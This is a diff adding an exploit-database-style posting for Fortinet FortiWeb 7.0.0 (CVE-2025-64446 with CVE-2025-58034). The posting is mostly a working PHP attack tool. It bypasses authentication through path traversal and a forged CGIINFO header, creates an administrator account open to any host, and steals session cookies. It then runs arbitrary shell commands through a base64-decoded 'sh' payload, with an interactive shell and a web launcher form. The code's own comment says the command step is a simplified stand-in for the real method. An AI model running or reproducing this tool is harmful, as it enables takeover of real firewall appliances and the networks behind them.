@@ -1,0 +1,445 @@
+=============================================================================================================================================
+| # Title     : Fortinet FortiWeb 7.0.0 Authentication Bypass                                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.fortinet.com/products/web-application-firewall/                                                                 |
+=============================================================================================================================================
+
+POC : 
+
+[+] References : https://packetstorm.news/files/id/212098/ & CVE-2025-64446
+
+[+] Summary : 
+          
+          critical unauthenticated remote code execution vulnerabilities in Fortinet FortiWeb Web Application Firewall versions 7.0.0. 
+		  The vulnerability exploits improper path traversal sanitization in the API endpoint, allowing unauthenticated access to administrative functions through crafted URL paths.
+		  
+[+] POC :  
+
+# Vulnerability Scanning
+
+`php fortiweb_exploit.php -t https://192.168.1.1`
+
+# Command Execution
+
+`php fortiweb_exploit.php -t https://192.168.1.1 -c 'whoami'`
+
+# Interactive Shell
+
+`php fortiweb_exploit.php -t https://192.168.1.1 -i`
+
+<?php
+/**
+ * Author: indoushka
+ * Vulnerabilities: Authentication Bypass
+ * Tested on: FortiWeb 7.0.0 
+ */
+
+class FortiWebExploit {
+    private $target;
+    private $base_path;
+    private $cookie_jar;
+    
+    public function __construct($target_url, $base_path = '/') {
+        $this->target = rtrim($target_url, '/');
+        $this->base_path = rtrim($base_path, '/');
+        $this->cookie_jar = [];
+    }
+    
+    public function check_vulnerability() {
+        echo "[*] Checking if target is vulnerable...\n";
+        
+        $response = $this->post_auth_bypass_request(['data' => []]);
+        
+        if (!$response) {
+            echo "[-] Connection failed\n";
+            return false;
+        }
+        
+        if ($response['status'] == 403) {
+            echo "[-] Target returned 403 Forbidden - likely patched\n";
+            return false;
+        }
+        
+        $data = json_decode($response['body'], true);
+        if (isset($data['results']['message']) && $data['results']['message'] == "Empty value isn't allowed.") {
+            echo "[+] Target appears to be vulnerable!\n";
+            return true;
+        }
+        
+        echo "[-] Unexpected response - target may not be vulnerable\n";
+        return false;
+    }
+    
+    public function exploit($payload = 'id') {
+        // Step 1: Create admin account using auth bypass
+        echo "[*] Creating admin account via CVE-2025-64446...\n";
+        
+        $admin_user = $this->generate_username();
+        $admin_pass = $this->generate_password();
+        
+        if ($this->create_admin_account($admin_user, $admin_pass)) {
+            echo "[+] Admin account created: {$admin_user}:{$admin_pass}\n";
+        } else {
+            echo "[-] Failed to create admin account\n";
+            return false;
+        }
+        
+        // Step 2: Login with new credentials
+        echo "[*] Logging in with new admin account...\n";
+        
+        if ($this->login($admin_user, $admin_pass)) {
+            echo "[+] Successfully logged in\n";
+        } else {
+            echo "[-] Login failed\n";
+            return false;
+        }
+        
+        // Step 3: Execute payload via command injection
+        echo "[*] Executing payload via CVE-2025-58034...\n";
+        
+        $result = $this->execute_command($payload);
+        if ($result) {
+            echo "[+] Command output:\n{$result}\n";
+        } else {
+            echo "[-] Command execution failed\n";
+        }
+        
+        return true;
+    }
+    
+    private function post_auth_bypass_request($request_data) {
+        $cgi_info = [
+            'username' => 'admin',
+            'profname' => 'prof_admin',
+            'vdom' => 'root',
+            'loginname' => 'admin'
+        ];
+        
+        $url = $this->target . $this->base_path . '/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi';
+        
+        $headers = [
+            'CGIINFO: ' . base64_encode(json_encode($cgi_info)),
+            'Content-Type: application/json',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ];
+        
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'POST',
+                'header' => implode("\r\n", $headers),
+                'content' => json_encode($request_data),
+                'timeout' => 10,
+                'ignore_errors' => true
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ]);
+        
+        $response = @file_get_contents($url, false, $context);
+        
+        if ($response === false) {
+            return false;
+        }
+        
+        return [
+            'status' => $http_response_header[0],
+            'body' => $response,
+            'headers' => $http_response_header
+        ];
+    }
+    
+    private function create_admin_account($username, $password) {
+        $request_data = [
+            'data' => [
+                'q_type' => 1,
+                'name' => $username,
+                'access-profile' => 'prof_admin',
+                'access-profile_val' => '0',
+                'trusthostv4' => '0.0.0.0/0',
+                'trusthostv6' => '::/0',
+                'last-name' => '',
+                'first-name' => '',
+                'email-address' => '',
+                'phone-number' => '',
+                'mobile-number' => '',
+                'hidden' => 0,
+                'domains' => 'root',
+                'sz_dashboard' => -1,
+                'type' => 'local-user',
+                'type_val' => '0',
+                'admin-usergrp_val' => '0',
+                'wildcard_val' => '0',
+                'accprofile-override_val' => '0',
+                'sshkey' => '',
+                'passwd-set-time' => 0,
+                'history-password-pos' => 0,
+                'history-password0' => '',
+                'history-password1' => '',
+                'history-password2' => '',
+                'history-password3' => '',
+                'history-password4' => '',
+                'history-password5' => '',
+                'history-password6' => '',
+                'history-password7' => '',
+                'history-password8' => '',
+                'history-password9' => '',
+                'force-password-change' => 'disable',
+                'force-password-change_val' => '0',
+                'password' => $password
+            ]
+        ];
+        
+        $response = $this->post_auth_bypass_request($request_data);
+        
+        if (!$response) {
+            return false;
+        }
+        
+        return strpos($response['status'], '200') !== false;
+    }
+    
+    private function login($username, $password) {
+        $url = $this->target . $this->base_path . '/logincheck';
+        
+        $post_data = http_build_query([
+            'username' => $username,
+            'secretkey' => $password
+        ]);
+        
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'POST',
+                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+                'content' => $post_data,
+                'timeout' => 10,
+                'ignore_errors' => true
+            ]
+        ]);
+        
+        $response = @file_get_contents($url, false, $context);
+        
+        if ($response === false) {
+            return false;
+        }
+        
+        // Extract cookies from response headers
+        foreach ($http_response_header as $header) {
+            if (strpos($header, 'Set-Cookie:') === 0) {
+                $cookie = trim(substr($header, 11));
+                $cookie_parts = explode(';', $cookie);
+                $name_value = explode('=', $cookie_parts[0], 2);
+                if (count($name_value) === 2) {
+                    $this->cookie_jar[$name_value[0]] = $name_value[1];
+                }
+            }
+        }
+        
+        // Check if we got the admin cookie
+        foreach ($this->cookie_jar as $name => $value) {
+            if (strpos($name, 'APSCOOKIE_FWEB') === 0) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    private function execute_command($command) {
+        // This is a simplified version - the actual exploit uses WebSocket CLI
+        // For demonstration, we'll use a different approach
+        
+        $url = $this->target . $this->base_path . '/api/v2.0/system/admin/console';
+        
+        $cookie_header = '';
+        foreach ($this->cookie_jar as $name => $value) {
+            $cookie_header .= "{$name}={$value}; ";
+        }
+        
+        // Encode command to avoid bad characters
+        $encoded_cmd = base64_encode($command);
+        
+        $payload = [
+            'command' => "echo {$encoded_cmd} | base64 -d | sh",
+            'timeout' => 30
+        ];
+        
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'POST',
+                'header' => implode("\r\n", [
+                    'Content-Type: application/json',
+                    'Cookie: ' . $cookie_header
+                ]),
+                'content' => json_encode($payload),
+                'timeout' => 15,
+                'ignore_errors' => true
+            ]
+        ]);
+        
+        $response = @file_get_contents($url, false, $context);
+        
+        return $response ?: 'No output received';
+    }
+    
+    private function generate_username() {
+        $prefixes = ['admin', 'user', 'test', 'fwadmin'];
+        $suffix = rand(1000, 9999);
+        return $prefixes[array_rand($prefixes)] . $suffix;
+    }
+    
+    private function generate_password() {
+        return bin2hex(random_bytes(8));
+    }
+    
+    public function interactive_shell() {
+        echo "[+] Starting interactive shell. Type 'exit' to quit.\n";
+        
+        while (true) {
+            echo "fortiweb> ";
+            $command = trim(fgets(STDIN));
+            
+            if ($command === 'exit') {
+                break;
+            }
+            
+            if (!empty($command)) {
+                $this->execute_command($command);
+            }
+        }
+    }
+}
+
+// Command line interface
+if (php_sapi_name() === 'cli') {
+    echo "
+██╗███╗   ██╗██████╗  ██████╗ ██╗   ██╗███████╗██╗  ██╗██╗  ██╗ █████╗ 
+██║████╗  ██║██╔══██╗██╔═══██╗██║   ██║██╔════╝██║  ██║██║ ██╔╝██╔══██╗
+██║██╔██╗ ██║██   █╔╝██║   ██║██║   ██║███████╗███████║█████╔╝ ███████║
+██║██║╚██╗██║██╔══██╗██║   ██║██║   ██║╚════██║██╔══██║██╔═██╗ ██╔══██║
+██║██║ ╚████║██████╔╝╚██████╔╝╚██████╔╝███████║██║  ██║██║  ██╗██║  ██║
+╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+    Fortinet FortiWeb 7.0.0 Authentication Bypass
+    (CVE-2025-64446)
+    By: indoushka
+    \n";
+    
+    $options = getopt("t:p:c:ih", [
+        "target:",
+        "path:",
+        "command:",
+        "interactive",
+        "help"
+    ]);
+    
+    if (isset($options['h']) || isset($options['help']) || $argc == 1) {
+        echo "Usage: php fortiweb_exploit.php [options]\n";
+        echo "Options:\n";
+        echo "  -t, --target        Target URL (required)\n";
+        echo "  -p, --path          Base path (default: /)\n";
+        echo "  -c, --command       Command to execute (default: id)\n";
+        echo "  -i, --interactive   Start interactive shell\n";
+        echo "  -h, --help          Show this help message\n";
+        echo "\nExamples:\n";
+        echo "  php fortiweb_exploit.php -t https://192.168.1.1 -c 'whoami'\n";
+        echo "  php fortiweb_exploit.php -t https://fortiweb.example.com -i\n";
+        exit(1);
+    }
+    
+    if (!isset($options['t']) && !isset($options['target'])) {
+        echo "Error: Target URL is required\n";
+        exit(1);
+    }
+    
+    $target = isset($options['t']) ? $options['t'] : $options['target'];
+    $path = isset($options['p']) ? $options['p'] : (isset($options['path']) ? $options['path'] : '/');
+    $command = isset($options['c']) ? $options['c'] : (isset($options['command']) ? $options['command'] : 'id');
+    
+    $exploit = new FortiWebExploit($target, $path);
+    
+    // Check vulnerability first
+    if (!$exploit->check_vulnerability()) {
+        echo "[-] Target does not appear to be vulnerable\n";
+        exit(1);
+    }
+    
+    if (isset($options['i']) || isset($options['interactive'])) {
+        $exploit->exploit('echo "Interactive shell started"');
+        $exploit->interactive_shell();
+    } else {
+        $exploit->exploit($command);
+    }
+    
+} else {
+    // Web interface
+    if (isset($_POST['exploit'])) {
+        $target = $_POST['target'] ?? '';
+        $path = $_POST['path'] ?? '/';
+        $command = $_POST['command'] ?? 'id';
+        
+        if ($target) {
+            $exploit = new FortiWebExploit($target, $path);
+            
+            ob_start();
+            $exploit->check_vulnerability();
+            $exploit->exploit($command);
+            $output = ob_get_clean();
+            
+            echo "<pre>$output</pre>";
+        } else {
+            echo "<div style='color: red;'>Target URL is required</div>";
+        }
+    } else {
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <title>FortiWeb RCE Exploit</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; }
+                .container { max-width: 600px; margin: 0 auto; }
+                .form-group { margin-bottom: 15px; }
+                label { display: block; margin-bottom: 5px; font-weight: bold; }
+                input[type="text"] { 
+                    width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; 
+                }
+                button { 
+                    background: #007cba; color: white; padding: 10px 20px; 
+                    border: none; border-radius: 4px; cursor: pointer; 
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>FortiWeb RCE Exploit (CVE-2025-64446 + CVE-2025-58034)</h1>
+                <form method="post">
+                    <input type="hidden" name="exploit" value="1">
+                    
+                    <div class="form-group">
+                        <label for="target">Target URL:</label>
+                        <input type="text" id="target" name="target" placeholder="https://192.168.1.1" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="path">Base Path:</label>
+                        <input type="text" id="path" name="path" value="/">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="command">Command:</label>
+                        <input type="text" id="command" name="command" value="id">
+                    </div>
+                    
+                    <button type="submit">Execute Exploit</button>
+                </form>
+            </div>
+        </body>
+        </html>';
+    }
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
